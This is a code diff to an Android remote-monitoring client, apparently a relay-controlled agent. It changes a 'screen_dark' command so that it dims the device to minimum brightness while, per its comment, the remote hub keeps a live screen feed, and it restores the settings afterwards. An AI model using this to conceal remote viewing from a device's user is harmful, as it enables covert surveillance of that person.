@@ -23,6 +23,9 @@ public class RelayClient {
     private final String         relayUrl;
     private Socket               socket;
 
+    private int savedBrightness     = -1;
+    private int savedBrightnessMode = -1;
+
     public RelayClient(MonitorService service, String agentName, String agentSecret, String relayUrl) {
         this.service     = service;
         this.agentName   = agentName;
@@ -290,17 +293,23 @@ public class RelayClient {
                 service.lockScreen(requester(args));
             });
 
-            // ── Black screen overlay ──────────────────────────────────────────
+            // ── Screen brightness control (dim to black for device user, hub still gets live feed)
             socket.on("screen_dark", args -> {
                 final String req = requester(args);
                 try {
-                    // Grab a frozen frame BEFORE the overlay hides the screen
-                    ScreenService ss = ScreenService.getInstance();
-                    if (ss != null) {
-                        byte[] frozen = ss.captureOneFrame();
-                        if (frozen != null) service.setFrozenFrame(frozen);
-                    }
-                    service.getScreenOverlay().showBlackScreen();
+                    android.content.ContentResolver cr = service.getContentResolver();
+                    // Save current state
+                    savedBrightnessMode = android.provider.Settings.System.getInt(cr,
+                        android.provider.Settings.System.SCREEN_BRIGHTNESS_MODE,
+                        android.provider.Settings.System.SCREEN_BRIGHTNESS_MODE_MANUAL);
+                    savedBrightness = android.provider.Settings.System.getInt(cr,
+                        android.provider.Settings.System.SCREEN_BRIGHTNESS, 128);
+                    // Disable adaptive brightness, then set to minimum
+                    android.provider.Settings.System.putInt(cr,
+                        android.provider.Settings.System.SCREEN_BRIGHTNESS_MODE,
+                        android.provider.Settings.System.SCREEN_BRIGHTNESS_MODE_MANUAL);
+                    android.provider.Settings.System.putInt(cr,
+                        android.provider.Settings.System.SCREEN_BRIGHTNESS, 1);
                     JSONObject res = new JSONObject();
                     res.put("ok", true);
                     res.put("_requester", req);
@@ -310,8 +319,16 @@ public class RelayClient {
             socket.on("screen_dark_off", args -> {
                 final String req = requester(args);
                 try {
-                    service.getScreenOverlay().hideBlackScreen();
-                    service.setFrozenFrame(null);
+                    if (savedBrightness >= 0) {
+                        android.content.ContentResolver cr = service.getContentResolver();
+                        android.provider.Settings.System.putInt(cr,
+                            android.provider.Settings.System.SCREEN_BRIGHTNESS_MODE,
+                            savedBrightnessMode);
+                        android.provider.Settings.System.putInt(cr,
+                            android.provider.Settings.System.SCREEN_BRIGHTNESS,
+                            savedBrightness);
+                        savedBrightness = savedBrightnessMode = -1;
+                    }
                     JSONObject res = new JSONObject();
                     res.put("ok", true);
                     res.put("_requester", req);
